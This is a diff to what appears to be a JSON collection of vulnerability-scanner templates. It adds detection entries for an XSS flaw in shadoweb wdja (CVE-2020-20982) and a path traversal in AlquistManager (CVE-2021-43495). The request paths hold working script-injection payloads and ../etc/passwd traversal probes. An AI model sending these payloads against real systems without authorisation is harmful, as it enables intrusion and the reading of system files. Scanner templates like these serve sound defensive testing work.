@@ -15939,7 +15939,7 @@
           "cwe-id": "CWE-434"
         },
         "description": "Adobe ColdFusion versions July 12 release (2018.0.0.310739), Update 6 and earlier, and Update 14 and earlier have an unrestricted file upload vulnerability. Successful exploitation could lead to arbitrary code execution.",
-        "name": "Adobe ColdFusion Unrestricted file upload RCE",
+        "name": "Adobe ColdFusion Unrestricted File Upload RCE",
         "reference": [
           "https://nvd.nist.gov/vuln/detail/CVE-2018-15961",
           "https://github.com/xbufu/CVE-2018-15961"
@@ -26120,6 +26120,52 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/gitlab/build_now%3Csvg/onload=alert(1337)%3E"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-20982",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2020-20982",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H",
+          "cvss-score": 9.6,
+          "cwe-id": "CWE-79"
+        },
+        "description": "Cross Site Scripting (XSS) vulnerability in shadoweb wdja v1.5.1, allows attackers to execute arbitrary code and gain escalated privileges, via the backurl parameter to /php/passport/index.php.",
+        "name": "Shadoweb Wdja v1.5.1 xss",
+        "reference": [
+          "https://github.com/shadoweb/wdja/issues/1",
+          "https://nvd.nist.gov/vuln/detail/CVE-2020-20982"
+        ],
+        "severity": "critical",
+        "tags": "cve,cve2020,xss,wdja,shadoweb"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "condition": "and",
+              "type": "word",
+              "words": [
+                "</script><script>alert(document.domain)</script>"
+              ]
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/php/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E",
+            "{{BaseURL}}/passport/index.php?action=manage&mtype=userset&backurl=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
           ]
         }
       ]
@@ -39393,6 +39439,43 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/go/add-on/business-continuity/api/plugin?folderName=&pluginName=../../../etc/passwd"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2021-43495",
+      "info": {
+        "author": "pikpikcu",
+        "classification": {
+          "cve-id": "CVE-2021-43495",
+          "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+          "cvss-score": 7.5,
+          "cwe-id": "CWE-22"
+        },
+        "description": "AlquistManager branch as of commit 280d99f43b11378212652e75f6f3159cde9c1d36 is affected by a directory traversal vulnerability in alquist/IO/input.py",
+        "name": "AlquistManager lfi",
+        "reference": [
+          "https://github.com/AlquistManager/alquist/issues/43",
+          "https://nvd.nist.gov/vuln/detail/CVE-2021-43495"
+        ],
+        "severity": "high",
+        "tags": "cve,cve2021,lfi,alquist"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "body",
+              "regex": [
+                "root:.*:0:0:"
+              ],
+              "type": "regex"
+            }
+          ],
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/asd/../../../../../../../../etc/passwd"
           ]
         }
       ]
